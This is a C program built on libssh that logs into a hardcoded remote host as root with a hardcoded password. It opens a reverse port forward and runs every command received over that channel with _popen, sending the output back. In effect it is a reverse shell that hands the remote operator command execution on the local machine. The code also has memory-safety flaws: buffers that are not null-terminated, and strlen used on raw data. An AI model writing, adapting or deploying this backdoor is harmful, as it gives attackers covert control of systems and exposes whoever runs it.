#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h> 
#include <string.h>
#include <errno.h>

int pseudo_shell(ssh_session session)
{
  int rc;
  ssh_channel channel;
  char buffer_ssh_in[256];
  int nbytes, nwritten;
  int port = 0;
  int port2=1337;
  rc = ssh_channel_listen_forward(session, NULL, 8080, &port2);
  if (rc != SSH_OK)
  {
    fprintf(stderr, "Error opening remote port: %s\n",
            ssh_get_error(session));
    return rc;
  }
  channel = ssh_channel_accept_forward(session, 60000, &port);
  if (channel == NULL)
  {
    fprintf(stderr, "Error waiting for incoming connection: %s\n",
            ssh_get_error(session));
    return SSH_ERROR;
  }
  while (1)
  {
    //user input
    nbytes = ssh_channel_read(channel, buffer_ssh_in, sizeof(buffer_ssh_in), 0);
    if (nbytes < 0)
    {
      fprintf(stderr, "Error reading incoming data: %s\n",
              ssh_get_error(session));
      ssh_channel_send_eof(channel);
      ssh_channel_free(channel);
      return SSH_ERROR;
    }

    //do some stuff
    FILE *fd;
    fd = _popen(buffer_ssh_in, "r");
    if (!fd) return 1;
 
    char   buffer[256];
    size_t chread;
    /* String to store entire command contents in */
    size_t comalloc = 256;
    size_t comlen   = 0;
    char  *comout   = (char *)malloc(comalloc);

    /* Use fread so binary data is dealt with correctly */
    while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
        if (comlen + chread >= comalloc) {
            comalloc *= 2;
            comout = (char *)realloc(comout, comalloc);
        }
        memmove(comout + comlen, buffer, chread);
        comlen += chread;
    }

    //write output
    nbytes = strlen(comout);
    nwritten = ssh_channel_write(channel, comout, nbytes);
    if (nwritten != nbytes)
    {
      fprintf(stderr, "Error sending answer: %s\n",
              ssh_get_error(session));
      ssh_channel_send_eof(channel);
      ssh_channel_free(channel);
      return SSH_ERROR;
    }
    printf("Sent answer\n");
  }
  ssh_channel_send_eof(channel);
  ssh_channel_free(channel);
  return SSH_OK;
}

int main()
{
  ssh_session my_ssh_session;
  int rc;
  char *password;
  // Open session and set options
  my_ssh_session = ssh_new();
  if (my_ssh_session == NULL)
    exit(-1);
  ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, "192.168.116.215");
  ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, "root");
  // Connect to server
  rc = ssh_connect(my_ssh_session);
  if (rc != SSH_OK)
  {
    fprintf(stderr, "Error connecting to localhost: %s\n",
            ssh_get_error(my_ssh_session));
    ssh_free(my_ssh_session);
    exit(-1);
  }

  // Authenticate ourselves
  // Give password here
  password = "password";
  rc = ssh_userauth_password(my_ssh_session, NULL, password);
  if (rc != SSH_AUTH_SUCCESS)
  {
    fprintf(stderr, "Error authenticating with password: %s\n",
            ssh_get_error(my_ssh_session));
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    exit(-1);
  }
 
  pseudo_shell(my_ssh_session);
  ssh_disconnect(my_ssh_session);
  ssh_free(my_ssh_session);
}


